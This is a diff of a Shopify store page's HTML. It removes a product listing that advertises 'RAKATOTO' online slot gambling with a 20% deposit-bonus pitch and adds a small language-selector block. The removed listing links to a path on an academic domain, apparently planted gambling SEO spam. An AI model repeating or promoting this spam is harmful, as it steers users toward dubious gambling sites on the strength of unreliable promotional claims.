-                            <svg class="icon icon-close" aria-hidden="true" focusable="false">
-                              <use xlink:href="#icon-reset">
-                            </svg>
-                          </button>
-                          <button class="search__button field__button" aria-label="Search">
-                            <svg class="icon icon-search" aria-hidden="true" focusable="false">
-                              <use href="#icon-search">
-                            </svg>
-                          </button>
-                        </div>
-                        <div class="predictive-search predictive-search--header" tabindex="-1" data-predictive-search>
-                          <link href="//0cc537-2.myshopify.com/cdn/shop/t/1/assets/component-loading-spinner.css?v=116724955567955766481700311598" rel="stylesheet" type="text/css" media="all" />
-                          <div class="predictive-search__loading-state">
-                            <svg aria-hidden="true" focusable="false" class="spinner" viewBox="0 0 66 66" xmlns="http://www.w3.org/2000/svg">
-                              <circle class="path" fill="none" stroke-width="6" cx="33" cy="33" r="30"></circle>
-                            </svg>
-                          </div>
-                        </div>
-                        <span class="predictive-search-status visually-hidden" role="status" aria-hidden="true"></span>
-                      </form>
-                    </predictive-search>
-                    <button type="button" class="search-modal__close-button modal__close-button link link--text focus-inset" aria-label="Close">
-                      <svg class="icon icon-close" aria-hidden="true" focusable="false">
-                        <use href="#icon-close">
-                      </svg>
-                    </button>
-                  </div>
+                <div class="language-definition__button-container">
+                    <div class="language-definition__select">
+                        <img class="language-definition__lang-image flag" alt="flag icon" width="20" height="15" /><span
+                            class="language-definition__lang-name"></span>
+                    </div>
+                    <a class="btn--min-size btn btn--filled language-definition__action">Continue</a>
                 </div>
-              </details>
-            </details-modal>
-            <a href="/cart" class="header__icon header__icon--cart link focus-inset" id="cart-icon-bubble">
-              <svg class="icon icon-cart-empty" aria-hidden="true" focusable="false" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 40 40" fill="none">
-                <path d="m15.75 11.8h-3.16l-.77 11.6a5 5 0 0 0 4.99 5.34h7.38a5 5 0 0 0 4.99-5.33l-.78-11.61zm0 1h-2.22l-.71 10.67a4 4 0 0 0 3.99 4.27h7.38a4 4 0 0 0 4-4.27l-.72-10.67h-2.22v.63a4.75 4.75 0 1 1 -9.5 0zm8.5 0h-7.5v.63a3.75 3.75 0 1 0 7.5 0z" fill="currentColor" fill-rule="evenodd" />
-              </svg>
-              <span class="visually-hidden">Cart</span>
-            </a>
-          </div>
-        </header>
-      </sticky-header>
-      <cart-notification>
-        <div class="cart-notification-wrapper page-width">
-          <div id="cart-notification" class="cart-notification focus-inset color-background-1 gradient" aria-modal="true" aria-label="Item added to your cart" role="dialog" tabindex="-1">
-            <div class="cart-notification__header">
-              <h2 class="cart-notification__heading caption-large text-body">
-                <svg class="icon icon-checkmark" aria-hidden="true" focusable="false" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 9" fill="none">
-                  <path fill-rule="evenodd" clip-rule="evenodd" d="M11.35.643a.5.5 0 01.006.707l-6.77 6.886a.5.5 0 01-.719-.006L.638 4.845a.5.5 0 11.724-.69l2.872 3.011 6.41-6.517a.5.5 0 01.707-.006h-.001z" fill="currentColor" />
-                </svg> Item added to your cart
-              </h2>
-              <button type="button" class="cart-notification__close modal__close-button link link--text focus-inset" aria-label="Close">
-                <svg class="icon icon-close" aria-hidden="true" focusable="false">
-                  <use href="#icon-close">
-                </svg>
-              </button>
-            </div>
-            <div id="cart-notification-product" class="cart-notification-product"></div>
-            <div class="cart-notification__links">
-              <a href="/cart" id="cart-notification-button" class="button button--secondary button--full-width">View cart</a>
-              <form action="/cart" method="post" id="cart-notification-form">
-                <button class="button button--primary button--full-width" name="checkout"> Check out </button>
-              </form>
-              <button type="button" class="link button-label">Continue shopping</button>
-            </div>
-          </div>
-        </div>
-      </cart-notification>
-      <style data-shopify>
-        .cart-notification {
-          display: none;
-        }
-      </style>
-      <script type="application/ld+json">
-        {
-          "@context": "http://schema.org",
-          "@type": "Organization",
-          "name": "RAKATOTO",
-          "sameAs": ["", "", "", "", "", "", "", "", ""],
-          "url": "https:\/\/0cc537-2.myshopify.com"
-        }
-      </script>
-    </div>
-    <!-- END sections: header-group -->
-    <main id="MainContent" class="content-for-layout focus-none" role="main" tabindex="-1">
-      <section id="shopify-section-template--15870901977135__main" class="shopify-section section">
-        <section id="MainProduct-template--15870901977135__main" class="section-template--15870901977135__main-padding gradient color-background-1" data-section="template--15870901977135__main">
-          <link href="//0cc537-2.myshopify.com/cdn/shop/t/1/assets/section-main-product.css?v=141059467971401676601700311625" rel="stylesheet" type="text/css" media="all" />
-          <link href="//0cc537-2.myshopify.com/cdn/shop/t/1/assets/component-accordion.css?v=180964204318874863811700311591" rel="stylesheet" type="text/css" media="all" />
-          <link href="//0cc537-2.myshopify.com/cdn/shop/t/1/assets/component-price.css?v=70172745017360139101700311602" rel="stylesheet" type="text/css" media="all" />
-          <link href="//0cc537-2.myshopify.com/cdn/shop/t/1/assets/component-slider.css?v=142503135496229589681700311605" rel="stylesheet" type="text/css" media="all" />
-          <link href="//0cc537-2.myshopify.com/cdn/shop/t/1/assets/component-rating.css?v=158881854592137137841700311603" rel="stylesheet" type="text/css" media="all" />
-          <link href="//0cc537-2.myshopify.com/cdn/shop/t/1/assets/component-deferred-media.css?v=14096082462203297471700311594" rel="stylesheet" type="text/css" media="all" />
-          <style data-shopify>
-            .section-template--15870901977135__main-padding {
-              padding-top: 27px;
-              padding-bottom: 9px;
-            }
-
-            @media screen and (min-width: 750px) {
-              .section-template--15870901977135__main-padding {
-                padding-top: 36px;
-                padding-bottom: 12px;
-              }
-            }
-          </style>
-          <script src="//0cc537-2.myshopify.com/cdn/shop/t/1/assets/product-info.js?v=81873523020508815201700311615" defer="defer"></script>
-          <script src="//0cc537-2.myshopify.com/cdn/shop/t/1/assets/product-form.js?v=133081758708377679181700311615" defer="defer"></script>
-          <div class="page-width">
-            <div class="product product--large product--left product--stacked product--mobile-hide grid grid--1-col grid--2-col-tablet">
-              <div class="grid__item product__media-wrapper">
-                <media-gallery id="MediaGallery-template--15870901977135__main" role="region" class="product__column-sticky" aria-label="Gallery Viewer" data-desktop-layout="stacked">
-                  <div id="GalleryStatus-template--15870901977135__main" class="visually-hidden" role="status"></div>
-                  <slider-component id="GalleryViewer-template--15870901977135__main" class="slider-mobile-gutter">
-                    <a class="skip-to-content-link button visually-hidden quick-add-hidden" href="#ProductInfo-template--15870901977135__main"> Skip to product information </a>
-                    <ul id="Slider-Gallery-template--15870901977135__main" class="product__media-list contains-media grid grid--peek list-unstyled slider slider--mobile" role="list">
-                      <li id="Slide-template--15870901977135__main-25754106363951" class="product__media-item grid__item slider__slide is-active scroll-trigger animate--fade-in" data-media-id="template--15870901977135__main-25754106363951">
-                        <div class="product-media-container media-type-image media-fit-contain global-media-settings gradient constrain-height" style="--ratio: 1.0; --preview-ratio: 1.0;">
-                          <noscript>
-                            <div class="product__media media">
-                              <img src="https://iili.io/JRKigR4.md.jpg" alt="" srcset="https://iili.io/JRKigR4.md.jpg" width="1946" height="1946" sizes="(min-width: 1200px) 715px, (min-width: 990px) calc(65.0vw - 10rem), (min-width: 750px) calc((100vw - 11.5rem) / 2), calc(100vw / 1 - 4rem)">
-                            </div>
-                          </noscript>
-                          <modal-opener class="product__modal-opener product__modal-opener--image no-js-hidden" data-modal="#ProductModal-template--15870901977135__main">
-                            <span class="product__media-icon motion-reduce quick-add-hidden product__media-icon--lightbox" aria-hidden="true">
-                              <svg aria-hidden="true" focusable="false" class="icon icon-plus" width="19" height="19" viewBox="0 0 19 19" fill="none" xmlns="http://www.w3.org/2000/svg">
-                                <path fill-rule="evenodd" clip-rule="evenodd" d="M4.66724 7.93978C4.66655 7.66364 4.88984 7.43922 5.16598 7.43853L10.6996 7.42464C10.9758 7.42395 11.2002 7.64724 11.2009 7.92339C11.2016 8.19953 10.9783 8.42395 10.7021 8.42464L5.16849 8.43852C4.89235 8.43922 4.66793 8.21592 4.66724 7.93978Z" fill="currentColor" />
-                                <path fill-rule="evenodd" clip-rule="evenodd" d="M7.92576 4.66463C8.2019 4.66394 8.42632 4.88723 8.42702 5.16337L8.4409 10.697C8.44159 10.9732 8.2183 11.1976 7.94215 11.1983C7.66601 11.199 7.44159 10.9757 7.4409 10.6995L7.42702 5.16588C7.42633 4.88974 7.64962 4.66532 7.92576 4.66463Z" fill="currentColor" />
-                                <path fill-rule="evenodd" clip-rule="evenodd" d="M12.8324 3.03011C10.1255 0.323296 5.73693 0.323296 3.03011 3.03011C0.323296 5.73693 0.323296 10.1256 3.03011 12.8324C5.73693 15.5392 10.1255 15.5392 12.8324 12.8324C15.5392 10.1256 15.5392 5.73693 12.8324 3.03011ZM2.32301 2.32301C5.42035 -0.774336 10.4421 -0.774336 13.5395 2.32301C16.6101 5.39361 16.6366 10.3556 13.619 13.4588L18.2473 18.0871C18.4426 18.2824 18.4426 18.599 18.2473 18.7943C18.0521 18.9895 17.7355 18.9895 17.5402 18.7943L12.8778 14.1318C9.76383 16.6223 5.20839 16.4249 2.32301 13.5395C-0.774335 10.4421 -0.774335 5.42035 2.32301 2.32301Z" fill="currentColor" />
-                              </svg>
-                            </span>
-                            <link href="//0cc537-2.myshopify.com/cdn/shop/t/1/assets/component-loading-spinner.css?v=116724955567955766481700311598" rel="stylesheet" type="text/css" media="all" />
-                            <div class="loading__spinner hidden">
-                              <svg aria-hidden="true" focusable="false" class="spinner" viewBox="0 0 66 66" xmlns="http://www.w3.org/2000/svg">
-                                <circle class="path" fill="none" stroke-width="6" cx="33" cy="33" r="30"></circle>
-                              </svg>
-                            </div>
-                            <div class="product__media media media--transparent">
-                              <img src="https://iili.io/JRKigR4.md.jpg" alt="" srcset="https://iili.io/JRKigR4.md.jpg" width="1946" height="1946" class="image-magnify-lightbox" sizes="(min-width: 1200px) 715px, (min-width: 990px) calc(65.0vw - 10rem), (min-width: 750px) calc((100vw - 11.5rem) / 2), calc(100vw / 1 - 4rem)">
-                            </div>
-                            <button class="product__media-toggle quick-add-hidden product__media-zoom-lightbox" type="button" aria-haspopup="dialog" data-media-id="25754106363951">
-                              <span class="visually-hidden"> Open media 1 in modal </span>
-                            </button>
-                          </modal-opener>
-                        </div>
-                      </li>
-                    </ul>
-                    <div class="slider-buttons no-js-hidden quick-add-hidden small-hide">
-                      <button type="button" class="slider-button slider-button--prev" name="previous" aria-label="Slide left">
-                        <svg aria-hidden="true" focusable="false" class="icon icon-caret" viewBox="0 0 10 6">
-                          <path fill-rule="evenodd" clip-rule="evenodd" d="M9.354.646a.5.5 0 00-.708 0L5 4.293 1.354.646a.5.5 0 00-.708.708l4 4a.5.5 0 00.708 0l4-4a.5.5 0 000-.708z" fill="currentColor">
-                        </svg>
-                      </button>
-                      <div class="slider-counter caption">
-                        <span class="slider-counter--current">1</span>
-                        <span aria-hidden="true"> / </span>
-                        <span class="visually-hidden">of</span>
-                        <span class="slider-counter--total">1</span>
-                      </div>
-                      <button type="button" class="slider-button slider-button--next" name="next" aria-label="Slide right">
-                        <svg aria-hidden="true" focusable="false" class="icon icon-caret" viewBox="0 0 10 6">
-                          <path fill-rule="evenodd" clip-rule="evenodd" d="M9.354.646a.5.5 0 00-.708 0L5 4.293 1.354.646a.5.5 0 00-.708.708l4 4a.5.5 0 00.708 0l4-4a.5.5 0 000-.708z" fill="currentColor">
-                        </svg>
-                      </button>
-                    </div>
-                  </slider-component>
-                </media-gallery>
-              </div>
-              <div class="product__info-wrapper grid__item scroll-trigger animate--slide-in">
-                <product-info id="ProductInfo-template--15870901977135__main" data-section="template--15870901977135__main" data-url="/products/lsxgacor" class="product__info-container product__column-sticky">
-                  <p class="product__text inline-richtext caption-with-letter-spacing">RAKATOTO</p>
-                  <div class="product__title">
-                    <h1>RAKATOTO - SLOT SERVER KOREA GAMPANG MAXWIN MIN DEPO 1000</h1>
-                    <a href="/products/lsxgacor" class="product__title">
-                      <h2 class="h1">RAKATOTO - SLOT SERVER KOREA GAMPANG MAXWIN MIN DEPO 1000</h2>
-                    </a>
-                  </div>
-                  <div class="no-js-hidden" id="price-template--15870901977135__main" role="status">
-                    <div class="
-    price price--large price--show-badge">
-                      <div class="price__container">
-                        <div class="price__regular">
-                          <span class="visually-hidden visually-hidden--inline">Regular price</span>
-                          <span class="price-item price-item--regular"> Rp 2.500.000,00 IDR </span>
-                        </div>
-                        <div class="price__sale">
-                          <span class="visually-hidden visually-hidden--inline">Regular price</span>
-                          <span>
-                            <s class="price-item price-item--regular"></s>
-                          </span>
-                          <span class="visually-hidden visually-hidden--inline">Sale price</span>
-                          <span class="price-item price-item--sale price-item--last"> Rp 2.500.000,00 IDR </span>
-                        </div>
-                        <small class="unit-price caption hidden">
-                          <span class="visually-hidden">Unit price</span>
-                          <span class="price-item price-item--last">
-                            <span></span>
-                            <span aria-hidden="true">/</span>
-                            <span class="visually-hidden">&nbsp;per&nbsp;</span>
-                            <span></span>
-                          </span>
-                        </small>
-                      </div>
-                      <span class="badge price__badge-sale color-accent-2"> Sale </span>
-                      <span class="badge price__badge-sold-out color-inverse"> Sold out </span>
-                    </div>
-                  </div>
-                  <div class="product__tax caption rte"></div>
-                  <div>
-                    <form method="post" action="/cart/add" id="product-form-installment-template--15870901977135__main" accept-charset="UTF-8" class="installment caption-large" enctype="multipart/form-data">
-                      <input type="hidden" name="form_type" value="product" />
-                      <input type="hidden" name="utf8" value="✓" />
-                      <input type="hidden" name="id" value="41888959627311">
-                      <input type="hidden" name="product-id" value="7362949021743" />
-                    </form>
-                  </div>
-                  <noscript class="product-form__noscript-wrapper-template--15870901977135__main">
-                    <div class="product-form__input hidden">
-                      <label class="form__label" for="Variants-template--15870901977135__main">Product variants</label>
-                      <div class="select">
-                        <select name="id" id="Variants-template--15870901977135__main" class="select__select" form="product-form-template--15870901977135__main">
-                          <option selected="selected" value="41888959627311">Default Title - Rp 2.500.000,00</option>
-                        </select>
-                        <svg aria-hidden="true" focusable="false" class="icon icon-caret" viewBox="0 0 10 6">
-                          <path fill-rule="evenodd" clip-rule="evenodd" d="M9.354.646a.5.5 0 00-.708 0L5 4.293 1.354.646a.5.5 0 00-.708.708l4 4a.5.5 0 00.708 0l4-4a.5.5 0 000-.708z" fill="currentColor">
-                        </svg>
-                      </div>
-                    </div>
-                  </noscript>
-                  <div class="product__description rte quick-add-hidden">
-                    <div>
-                      <a href="https://sayurglobal.shop/rt/" title="RAKATOTO">
-                        <img src="https://iili.io/JRK6B5l.gif" alt="RAKATOTO" style="display: block; margin-left: auto; margin-right: auto;" data-mce-fragment="1" data-mce-src="https://iili.io/JRK6B5l.gif">
-                      </a>
-                    </div>
-                    <div></div>
-                    <div><a href="https://stieganesha.ac.id/plugins/uplot/slotgacor/rakatoto/">RAKATOTO</a> Rakatoto Juga Bonus dan promosi yang ditawarkan oleh RAKATOTO juga cukup menarik. Anda bisa mendapatkan bonus deposit sebesar 20% untuk setiap deposit yang Anda lakukan. </div>
-                  </div>
-                  <div id="Quantity-Form-template--15870901977135__main" class="product-form__input product-form__quantity">
-                    <label class="quantity__label form__label" for="Quantity-template--15870901977135__main"> Quantity <span class="quantity__rules-cart no-js-hidden hidden">
-                        <link href="//0cc537-2.myshopify.com/cdn/shop/t/1/assets/component-loading-spinner.css?v=116724955567955766481700311598" rel="stylesheet" type="text/css" media="all" />
-                        <div class="loading__spinner hidden">
-                          <svg aria-hidden="true" focusable="false" class="spinner" viewBox="0 0 66 66" xmlns="http://www.w3.org/2000/svg">
-                            <circle class="path" fill="none" stroke-width="6" cx="33" cy="33" r="30"></circle>
-                          </svg>
-                        </div>
-                        <span>( <span class="quantity-cart">0</span> in cart) </span>
-                      </span>
-                    </label>
-                    <div class="price-per-item__container">
-                      <quantity-input class="quantity" data-url="/products/lsxgacor" data-section="template--15870901977135__main">
-                        <button class="quantity__button no-js-hidden" name="minus" type="button">
-                          <span class="visually-hidden">Decrease quantity for RAKATOTO - SLOT SERVER KOREA GAMPANG MAXWIN MIN DEPO 1000</span>
-                          <svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" class="icon icon-minus" fill="none" viewBox="0 0 10 2">
-                            <path fill-rule="evenodd" clip-rule="evenodd" d="M.5 1C.5.7.7.5 1 .5h8a.5.5 0 110 1H1A.5.5 0 01.5 1z" fill="currentColor">
-                          </svg>
-                        </button>
-                        <input class="quantity__input" type="number" name="quantity" id="Quantity-template--15870901977135__main" data-cart-quantity="0" data-min="1" min="1" step="1" value="1" form="product-form-template--15870901977135__main" />
-                        <button class="quantity__button no-js-hidden" name="plus" type="button">
-                          <span class="visually-hidden">Increase quantity for RAKATOTO - SLOT SERVER KOREA GAMPANG MAXWIN MIN DEPO 1000</span>
-                          <svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" class="icon icon-plus" fill="none" viewBox="0 0 10 10">
-                            <path fill-rule="evenodd" clip-rule="evenodd" d="M1 4.51a.5.5 0 000 1h3.5l.01 3.5a.5.5 0 001-.01V5.5l3.5-.01a.5.5 0 00-.01-1H5.5L5.49.99a.5.5 0 00-1 .01v3.5l-3.5.01H1z" fill="currentColor">
-                          </svg>
-                        </button>
-                      </quantity-input>
-                    </div>
-                    <div class="quantity__rules caption no-js-hidden" id="Quantity-Rules-template--15870901977135__main"></div>
-                  </div>
-                  <div>
-                    <product-form class="product-form" data-hide-errors="false" data-section-id="template--15870901977135__main">
-                      <div class="product-form__error-message-wrapper" role="alert" hidden>
-                        <svg aria-hidden="true" focusable="false" class="icon icon-error" viewBox="0 0 13 13">
-                          <circle cx="6.5" cy="6.50049" r="5.5" stroke="white" stroke-width="2" />
-                          <circle cx="6.5" cy="6.5" r="5.5" fill="#EB001B" stroke="#EB001B" stroke-width="0.7" />
-                          <path d="M5.87413 3.52832L5.97439 7.57216H7.02713L7.12739 3.52832H5.87413ZM6.50076 9.66091C6.88091 9.66091 7.18169 9.37267 7.18169 9.00504C7.18169 8.63742 6.88091 8.34917 6.50076 8.34917C6.12061 8.34917 5.81982 8.63742 5.81982 9.00504C5.81982 9.37267 6.12061 9.66091 6.50076 9.66091Z" fill="white" />
-                          <path d="M5.87413 3.17832H5.51535L5.52424 3.537L5.6245 7.58083L5.63296 7.92216H5.97439H7.02713H7.36856L7.37702 7.58083L7.47728 3.537L7.48617 3.17832H7.12739H5.87413ZM6.50076 10.0109C7.06121 10.0109 7.5317 9.57872 7.5317 9.00504C7.5317 8.43137 7.06121 7.99918 6.50076 7.99918C5.94031 7.99918 5.46982 8.43137 5.46982 9.00504C5.46982 9.57872 5.94031 10.0109 6.50076 10.0109Z" fill="white" stroke="#EB001B" stroke-width="0.7">
-                        </svg>
-                        <span class="product-form__error-message"></span>
-                      </div>
-                      <form method="post" action="/cart/add" id="product-form-template--15870901977135__main" accept-charset="UTF-8" class="form" enctype="multipart/form-data" novalidate="novalidate" data-type="add-to-cart-form">
-                        <input type="hidden" name="form_type" value="product" />
-                        <input type="hidden" name="utf8" value="✓" />
-                        <input type="hidden" name="id" value="41888959627311" class="product-variant-id">
-                        <div class="product-form__buttons">
-                          <button id="ProductSubmitButton-template--15870901977135__main" type="submit" name="add" class="product-form__submit button button--full-width button--secondary">
-                            <span>Add to cart </span>
-                            <link href="//0cc537-2.myshopify.com/cdn/shop/t/1/assets/component-loading-spinner.css?v=116724955567955766481700311598" rel="stylesheet" type="text/css" media="all" />
-                            <div class="loading__spinner hidden">
-                              <svg aria-hidden="true" focusable="false" class="spinner" viewBox="0 0 66 66" xmlns="http://www.w3.org/2000/svg">
-                                <circle class="path" fill="none" stroke-width="6" cx="33" cy="33" r="30"></circle>
-                              </svg>
-                            </div>
-                          </button>
-                          <div data-shopify="payment-button" data-has-selling-plan="false" data-has-fixed-selling-plan="false" class="shopify-payment-button">
-                            <button class="shopify-payment-button__button shopify-payment-button__button--unbranded shopify-payment-button__button--hidden" disabled="disabled" aria-hidden="true"></button>
-                            <button class="shopify-payment-button__more-options shopify-payment-button__button--hidden" disabled="disabled" aria-hidden="true"></button>
-                          </div>
-                        </div>
-                        <input type="hidden" name="product-id" value="7362949021743" />
-                      </form>
-                    </product-form>
-                    <link href="//0cc537-2.myshopify.com/cdn/shop/t/1/assets/component-pickup-availability.css?v=34645222959864780961700311602" rel="stylesheet" type="text/css" media="all" />
-                    <pickup-availability class="product__pickup-availabilities no-js-hidden quick-add-hidden" data-root-url="/" data-variant-id="41888959627311" data-has-only-default-variant="true" data-product-page-color-scheme="gradient color-background-1">
-                      <template>
-                        <pickup-availability-preview class="pickup-availability-preview">
-                          <svg xmlns="http://www.w3.org/2000/svg" fill="none" aria-hidden="true" focusable="false" class="icon icon-unavailable" fill="none" viewBox="0 0 20 20">
-                            <path fill="#DE3618" stroke="#fff" d="M13.94 3.94L10 7.878l-3.94-3.94A1.499 1.499 0 103.94 6.06L7.88 10l-3.94 3.94a1.499 1.499 0 102.12 2.12L10 12.12l3.94 3.94a1.497 1.497 0 002.12 0 1.499 1.499 0 000-2.12L12.122 10l3.94-3.94a1.499 1.499 0 10-2.121-2.12z" />
-                          </svg>
-                          <div class="pickup-availability-info">
-                            <p class="caption-large">Couldn&#39;t load pickup availability</p>
-                            <button class="pickup-availability-button link link--text underlined-link"> Refresh </button>
-                          </div>
-                        </pickup-availability-preview>
-                      </template>
-                    </pickup-availability>
-                    <script src="//0cc537-2.myshopify.com/cdn/shop/t/1/assets/pickup-availability.js?v=66138958121968076331700311613" defer="defer"></script>
-                  </div>
-                  <script src="//0cc537-2.myshopify.com/cdn/shop/t/1/assets/share.js?v=13024540447964430191700311627" defer="defer"></script>
-                  <share-button id="Share-template--15870901977135__main" class="share-button quick-add-hidden">
-                    <button class="share-button__button hidden">
-                      <svg width="13" height="12" viewBox="0 0 13 12" class="icon icon-share" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false">
-                        <path d="M1.625 8.125V10.2917C1.625 10.579 1.73914 10.8545 1.9423 11.0577C2.14547 11.2609 2.42102 11.375 2.70833 11.375H10.2917C10.579 11.375 10.8545 11.2609 11.0577 11.0577C11.2609 10.8545 11.375 10.579 11.375 10.2917V8.125" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" />
-                        <path fill-rule="evenodd" clip-rule="evenodd" d="M6.14775 1.27137C6.34301 1.0761 6.65959 1.0761 6.85485 1.27137L9.56319 3.9797C9.75845 4.17496 9.75845 4.49154 9.56319 4.6868C9.36793 4.88207 9.05135 4.88207 8.85609 4.6868L6.5013 2.33203L4.14652 4.6868C3.95126 4.88207 3.63468 4.88207 3.43942 4.6868C3.24415 4.49154 3.24415 4.17496 3.43942 3.9797L6.14775 1.27137Z" fill="currentColor" />
-                        <path fill-rule="evenodd" clip-rule="evenodd" d="M6.5 1.125C6.77614 1.125 7 1.34886 7 1.625V8.125C7 8.40114 6.77614 8.625 6.5 8.625C6.22386 8.625 6 8.40114 6 8.125V1.625C6 1.34886 6.22386 1.125 6.5 1.125Z" fill="currentColor" />
-                      </svg> Share </button>
-                    <details id="Details-share-template--15870901977135__main">
-                      <summary class="share-button__button">
-                        <svg width="13" height="12" viewBox="0 0 13 12" class="icon icon-share" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false">
-                          <path d="M1.625 8.125V10.2917C1.625 10.579 1.73914 10.8545 1.9423 11.0577C2.14547 11.2609 2.42102 11.375 2.70833 11.375H10.2917C10.579 11.375 10.8545 11.2609 11.0577 11.0577C11.2609 10.8545 11.375 10.579 11.375 10.2917V8.125" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" />
-                          <path fill-rule="evenodd" clip-rule="evenodd" d="M6.14775 1.27137C6.34301 1.0761 6.65959 1.0761 6.85485 1.27137L9.56319 3.9797C9.75845 4.17496 9.75845 4.49154 9.56319 4.6868C9.36793 4.88207 9.05135 4.88207 8.85609 4.6868L6.5013 2.33203L4.14652 4.6868C3.95126 4.88207 3.63468 4.88207 3.43942 4.6868C3.24415 4.49154 3.24415 4.17496 3.43942 3.9797L6.14775 1.27137Z" fill="currentColor" />
-                          <path fill-rule="evenodd" clip-rule="evenodd" d="M6.5 1.125C6.77614 1.125 7 1.34886 7 1.625V8.125C7 8.40114 6.77614 8.625 6.5 8.625C6.22386 8.625 6 8.40114 6 8.125V1.625C6 1.34886 6.22386 1.125 6.5 1.125Z" fill="currentColor" />
-                        </svg> Share
-                      </summary>
-                      <div class="share-button__fallback motion-reduce">
-                        <div class="field">
-                          <span id="ShareMessage-template--15870901977135__main" class="share-button__message hidden" role="status"></span>
-                          <input type="text" class="field__input" id="ShareUrl-template--15870901977135__main" value="https://stieganesha.ac.id/plugins/uplot/slotgacor/rakatoto/" placeholder="Link" onclick="this.select();" readonly>
-                          <label class="field__label" for="ShareUrl-template--15870901977135__main">Link</label>
-                        </div>
-                        <button class="share-button__close hidden no-js-hidden">
-                          <svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" class="icon icon-close" fill="none" viewBox="0 0 18 17">
-                            <path d="M.865 15.978a.5.5 0 00.707.707l7.433-7.431 7.579 7.282a.501.501 0 00.846-.37.5.5 0 00-.153-.351L9.712 8.546l7.417-7.416a.5.5 0 10-.707-.708L8.991 7.853 1.413.573a.5.5 0 10-.693.72l7.563 7.268-7.418 7.417z" fill="currentColor">
-                          </svg>
-                          <span class="visually-hidden">Close share</span>
-                        </button>
-                        <button class="share-button__copy no-js-hidden">
-                          <svg class="icon icon-clipboard" width="11" height="13" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" viewBox="0 0 11 13">
-                            <path fill-rule="evenodd" clip-rule="evenodd" d="M2 1a1 1 0 011-1h7a1 1 0 011 1v9a1 1 0 01-1 1V1H2zM1 2a1 1 0 00-1 1v9a1 1 0 001 1h7a1 1 0 001-1V3a1 1 0 00-1-1H1zm0 10V3h7v9H1z" fill="currentColor" />
-                          </svg>
-                          <span class="visually-hidden">Copy link</span>
-                        </button>
-                      </div>
-                    </details>
-                  </share-button>
-                  <a href="/products/lsxgacor" class="link product__view-details animate-arrow"> View full details <svg viewBox="0 0 14 10" fill="none" aria-hidden="true" focusable="false" class="icon icon-arrow" xmlns="http://www.w3.org/2000/svg">
-                      <path fill-rule="evenodd" clip-rule="evenodd" d="M8.537.808a.5.5 0 01.817-.162l4 4a.5.5 0 010 .708l-4 4a.5.5 0 11-.708-.708L11.793 5.5H1a.5.5 0 010-1h10.793L8.646 1.354a.5.5 0 01-.109-.546z" fill="currentColor">
-                    </svg>
-                  </a>
-                </product-info>
-              </div>
-            </div>
-            <product-modal id="ProductModal-template--15870901977135__main" class="product-media-modal media-modal">
-              <div class="product-media-modal__dialog color-background-1 gradient" role="dialog" aria-label="Media gallery" aria-modal="true" tabindex="-1">
-                <button id="ModalClose-template--15870901977135__main" type="button" class="product-media-modal__toggle" aria-label="Close">
-                  <svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" class="icon icon-close" fill="none" viewBox="0 0 18 17">
-                    <path d="M.865 15.978a.5.5 0 00.707.707l7.433-7.431 7.579 7.282a.501.501 0 00.846-.37.5.5 0 00-.153-.351L9.712 8.546l7.417-7.416a.5.5 0 10-.707-.708L8.991 7.853 1.413.573a.5.5 0 10-.693.72l7.563 7.268-7.418 7.417z" fill="currentColor">
-                  </svg>
+                <button class="language-definition__close">
+                    <img src="assets/icons/crossdfa6.svg" width="8" height="8" alt="close icon" />
                 </button>
-                <div class="product-media-modal__content color-background-1 gradient" role="document" aria-label="Media gallery" tabindex="0">
-                  <img class="global-media-settings global-media-settings--no-shadow" srcset="https://iili.io/JRKigR4.md.jpg" alt="RAKATOTO - SLOT SERVER KOREA GAMPANG MAXWIN MIN DEPO 1000" loading="lazy" width="1100" height="1100" data-media-id="25754106363951">
-                </div>
-              </div>
-            </product-modal>
-            <script src="//0cc537-2.myshopify.com/cdn/shop/t/1/assets/product-modal.js?v=116616134454508949461700311615" defer="defer"></script>
-            <script src="//0cc537-2.myshopify.com/cdn/shop/t/1/assets/media-gallery.js?v=96661908581229995091700311612" defer="defer"></script>
-            <script>
-              document.addEventListener('DOMContentLoaded', function() {
-                function isIE() {
-                  const ua = window.navigator.userAgent;
-                  const msie = ua.indexOf('MSIE ');
-                  const trident = ua.indexOf('Trident/');
-                  return msie > 0 || trident > 0;
-                }
-                if (!isIE()) return;
-                const hiddenInput = document.querySelector('#product-form-template--15870901977135__main input[name="id"]');
-                const noScriptInputWrapper = document.createElement('div');
-                const variantSwitcher = document.querySelector('variant-radios[data-section="template--15870901977135__main"]') || document.querySelector('variant-selects[data-section="template--15870901977135__main"]');
-                noScriptInputWrapper.innerHTML = document.querySelector('.product-form__noscript-wrapper-template--15870901977135__main').textContent;
-                variantSwitcher.outerHTML = noScriptInputWrapper.outerHTML;
-                document.querySelector('#Variants-template--15870901977135__main').addEventListener('change', function(event) {
-                  hiddenInput.value = event.currentTarget.value;
-                });
-              });
-            </script>
-            <script type="application/ld+json">
-              {
-                "@context": "http://schema.org/",
-                "@type": "Product",
-                "name": "RAKATOTO - SLOT SERVER KOREA GAMPANG MAXWIN MIN DEPO 1000",
-                "url": "https:\/\/0cc537-2.myshopify.com\/products\/lsxgacor",
-                "image": ["https://iili.io/JRKigR4.md.jpg"],
-                "description": "\n\nRakatoto Juga Bonus dan promosi yang ditawarkan oleh RAKATOTO juga cukup menarik. Anda bisa mendapatkan bonus deposit sebesar 20% untuk setiap deposit yang Anda lakukan.",
-                "brand": {
-                  "@type": "Brand",
-                  "name": "RAKATOTO"
-                },
-                "offers": [{
-                  "@type": "Offer",
-                  "availability": "http://schema.org/InStock",
-                  "price": 2500000.0,
-                  "priceCurrency": "IDR",
-                  "url": "https:\/\/0cc537-2.myshopify.com\/products\/lsxgacor?variant=41888959627311"
-                }]
-              }
-            </script>
-          </div>
-        </section>
-      </section>
-      <section id="shopify-section-template--15870901977135__related-products" class="shopify-section section">
